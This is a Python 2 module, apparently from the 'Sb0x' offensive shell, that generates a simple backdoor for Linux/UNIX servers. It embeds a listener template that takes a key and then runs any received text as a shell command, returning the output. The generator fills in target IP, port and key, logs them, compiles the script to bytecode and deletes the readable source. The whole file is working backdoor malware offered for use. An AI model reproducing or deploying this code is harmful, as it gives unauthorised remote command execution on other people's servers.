"""
backdoor_server.py - Priv* script Written by Levi Nachmani (levi0x0) for the Sb0x shell

Author: Levi Nachamni (levi0x0)
Date: 20/05/2014
Version: 0.1
License: GPL 3

Description:
	A Very simple Backdoor for Linux/UNIX Servers

"""

MODULE_NAME = "Sb0x Server Backdoor"
MODULE_AUTHOR = "Levi Nachamni (levi0x0)"
MODULE_LICENSE = "GPL 3"
MODULE_VERSION = "0.1"
MODULE_DESC = "A Very simple Backdoor for Linux/UNIX Servers"

import random
import string
import os
import py_compile
from api.std import *

server_code =  '''
#!/usr/bin/env python
 
import commands
from socket import *
import sys

HOST = "%s"
PORT = %d
EXCUTE = False
KEY = "%s"

def main():
  COUNT = 0
  while True:
    COUNT += 1
    s = socket(AF_INET, SOCK_STREAM) 
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind(( HOST, PORT ))
    s.listen(1)
    c , addr = s.accept()
    if COUNT == 1:	
      data = c.recv(1024)
      if data == KEY:	  
	c.send(KEY)
	s.close()
	continue
      else:	  
	c.send('')
	COUNT -= 1 
	s.close() 
	continue
    elif COUNT > 1:	
      data = c.recv(1024)
      if data == KEY:	  
	c.send(KEY)
	s.close()
      else:	
	  try:  
	    Out = commands.getoutput(data)
	    if not Out:	
	      c.send("No Output")
	      s.close() 
	    else:	
	      c.send(Out)
	      s.close()  
	  except:  
	   c.send("Server ERROR!!")
	   s.close()
	   continue
    else:	
      s.close()
      pass
      sys.exit()

if __name__ == '__main__':
	while True:
		try:
			main()
		except:
			pass
			continue
'''
def main():
	#===============#
    #server code gen #
   #================#
	target = raw_input("Target IP (Example: 10.0.0.1):") #target
	port = int(raw_input("Port:")) #port
	key = raw_input("Key: (Example: sb0xbest):") #key like password
	code = server_code % (target,port,key) #server code 
	path = "%s/output/%s" % (home, target)
	if not os.path.exists(path):
		os.mkdir(path)
	def rd(length):
   		return ''.join(random.choice(string.lowercase) for i in range(length))
   	log_path = "%s/%s.log" % (path, target)
   	logs = "sb0x backdoor_server for linux logos\n1.Target:%s:%d\n2.Key:%s\n%s\nhttps://github.com/levi0x0/sb0x-project\n" % (target, port, key, "-" * 20, )
	log = open(log_path, "w")
	log.write(logs)
	log.close()
	file_name = "%s/%s.py" % (path,rd(4))
	server = open(file_name, "w")
	server.write(code)
	server.close()
	py_compile.compile(file_name)
	os.remove(file_name)
	notify( "[+] Saved: %sc" % (file_name))
